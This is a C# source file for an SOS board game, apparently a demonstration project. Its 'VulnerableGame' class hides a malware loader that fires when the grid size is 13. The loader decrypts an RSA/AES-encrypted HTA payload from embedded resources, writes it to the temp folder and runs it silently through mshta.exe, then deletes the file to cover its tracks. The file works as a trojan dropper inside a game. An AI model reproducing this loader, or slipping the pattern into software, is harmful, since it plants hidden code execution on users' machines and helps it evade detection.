using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace SOSGame.Logic
{
    public class VulnerableGame : BaseGame
    {
        public VulnerableGame(int gridSize) : base(3)
        {

            foreach (var name in System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceNames())
            {
                Console.WriteLine("[RESOURCE] " + name);
            }

            if (gridSize == 13)
            {
                Console.WriteLine("[DEBUG] Exploit trigger detected");
                Trigger_LOLBin_Execution();
            }
        }

        public override bool MakeMove(int row, int col, char letter)
        {
            return false;
        }


        protected virtual async void Trigger_LOLBin_Execution()
        {
            try
            {
                // Load from embedded resources
                byte[] encryptedPayload = LoadEmbeddedResource("SOSGame.GUI.Resources.payload.enc");
                byte[] encryptedKey = LoadEmbeddedResource("SOSGame.GUI.Resources.aeskey.enc");
                string privateKeyXml = Encoding.UTF8.GetString(LoadEmbeddedResource("SOSGame.GUI.Resources.private_key.xml"));


                Console.WriteLine("[DEBUG] Embedded files loaded. Decrypting key...");

                // Decrypt AES key and IV using RSA
                byte[] combinedKey;
                using (var rsa = RSA.Create())
                {
                    rsa.FromXmlString(privateKeyXml);
                    combinedKey = rsa.Decrypt(encryptedKey, RSAEncryptionPadding.Pkcs1);
                }

                byte[] aesKey = new byte[32];
                byte[] aesIV = new byte[16];
                Buffer.BlockCopy(combinedKey, 0, aesKey, 0, 32);
                Buffer.BlockCopy(combinedKey, 32, aesIV, 0, 16);

                Console.WriteLine("[DEBUG] AES key and IV extracted. Decrypting HTA...");

                // Decrypt HTA content
                string decryptedHta;
                using (var aes = Aes.Create())
                {
                    aes.Key = aesKey;
                    aes.IV = aesIV;

                    using var mem = new MemoryStream(encryptedPayload);
                    using var crypto = new CryptoStream(mem, aes.CreateDecryptor(), CryptoStreamMode.Read);
                    using var reader = new StreamReader(crypto, Encoding.UTF8);
                    decryptedHta = await reader.ReadToEndAsync();
                }

                // Write temp HTA file
                string tempFilePath = Path.Combine(Path.GetTempPath(), "payload.hta");
                await File.WriteAllTextAsync(tempFilePath, decryptedHta, Encoding.UTF8);
                Console.WriteLine($"[DEBUG] HTA written to: {tempFilePath}");

                // Execute HTA
                Process.Start(new ProcessStartInfo
                {
                    FileName = "mshta.exe",
                    Arguments = tempFilePath,
                    UseShellExecute = false,
                    CreateNoWindow = true
                });


                await Task.Delay(3000);
                File.Delete(tempFilePath);
                Console.WriteLine("[DEBUG] HTA deleted");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[ERROR] Exploit failed: " + ex.Message);
            }
        }


        private string DecryptPayload(byte[] encryptedData, string privateKeyXml)
        {
            using (var rsa = RSA.Create())
            {
                rsa.FromXmlString(privateKeyXml);
                byte[] decryptedBytes = rsa.Decrypt(encryptedData, RSAEncryptionPadding.Pkcs1);
                byte[] decompressedBytes = Decompress(decryptedBytes);
                return Encoding.UTF8.GetString(decompressedBytes);
            }
        }

        private byte[] Decompress(byte[] data)
        {
            using (var input = new MemoryStream(data))
            using (var gzip = new GZipStream(input, CompressionMode.Decompress))
            using (var output = new MemoryStream())
            {
                gzip.CopyTo(output);
                return output.ToArray();
            }
        }

        private byte[] LoadEmbeddedResource(string resourceName)
        {
            // Get the GUI assembly instead of the logic one
            var assemblies = AppDomain.CurrentDomain.GetAssemblies();
            var guiAssembly = assemblies.FirstOrDefault(a => a.GetName().Name == "SOSGame.GUI");

            if (guiAssembly == null)
            {
                Console.WriteLine("[ERROR] SOSGame.GUI assembly not found.");
                throw new FileNotFoundException("Missing SOSGame.GUI assembly");
            }

            foreach (var res in guiAssembly.GetManifestResourceNames())
                Console.WriteLine("[RESOURCE] " + res);

            using Stream? stream = guiAssembly.GetManifestResourceStream(resourceName);
            if (stream == null)
                throw new FileNotFoundException("Embedded resource not found: " + resourceName);

            using MemoryStream ms = new MemoryStream();
            stream.CopyTo(ms);
            return ms.ToArray();
        }

    }
}
